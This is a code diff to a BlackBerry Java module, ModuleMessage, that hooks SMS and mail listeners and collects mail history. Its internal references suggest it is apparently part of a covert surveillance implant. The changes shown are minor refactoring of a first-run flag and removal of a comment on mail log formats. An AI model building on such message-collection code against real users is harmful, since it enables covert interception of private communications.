@@ -42,28 +42,6 @@ import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
 import blackberry.utils.WChar;
 
-/*
- * http://rcs-dev/trac/browser/RCSASP/deps/Common/ASP_Common.h
- * 
- * 118  #define LOGTYPE_MAIL_RAW                        0x1001
- 119 #define LOGTYPE_MAIL                            0x0210
-
-
- * 198  typedef struct _MailAdditionalData {
- 199         UINT uVersion;
- 200                 #define LOG_MAIL_VERSION 2009070301
- 201         UINT uFlags;
- 202         UINT uSize;
- 203         FILETIME ftTime;
- 204 } MailAdditionalData, *pMailAdditionalData;
-
- http://rcs-dev/trac/browser/RCSASP/deps/XML-RPC/XMLInserting.cpp
-
- uFlags = 1 : body retrieved
- 0: non ha superato i controlli di size, il body viene tagliato
-
- */
-
 /**
  * The Class MessageAgent.
  */
@@ -71,7 +49,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
         MailObserver {
 
     //#ifdef DEBUG
-    static Debug debug = new Debug("MessageAgent", DebugLevel.VERBOSE);
+    static Debug debug = new Debug("ModMessage", DebugLevel.VERBOSE);
     //#endif
 
     private static final int SMS_VERSION = 2010050501;
@@ -96,7 +74,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
     Filter filterEmailCollect;
     Filter filterEmailRuntime;
 
-    boolean firstRun;
+    //boolean firstRun;
     Thread historyThread = null;
     private boolean mailHistory;
 
@@ -134,7 +112,6 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
         //smsListener.setMessageAgent(this);
     }
 
-    //TODO da riempire il parse
     public boolean parse(ConfModule conf) {
         setPeriod(NEVER);
         setDelay(100);
@@ -173,7 +150,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
      * @see blackberry.threadpool.TimerJob#actualStart()
      */
     public void actualStart() {
-        firstRun = true;
+
         if (smsEnabled) {
             smsListener.addSmsObserver(this, null, null);
         }
@@ -181,11 +158,11 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
         if (mailEnabled) {
             mailListener.addSingleMailObserver(this);
 
-            if (firstRun) {
+            if (status.firstMessageRun) {
                 //#ifdef DEBUG
                 debug.info("First Run");
                 //#endif
-                firstRun = false;
+                status.firstMessageRun = false;
 
                 if (mailEnabled) {
                     if (historyThread != null) {
@@ -217,6 +194,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
                 }
             }
         }
+        status.firstMessageRun = true;
     }
 
     /*
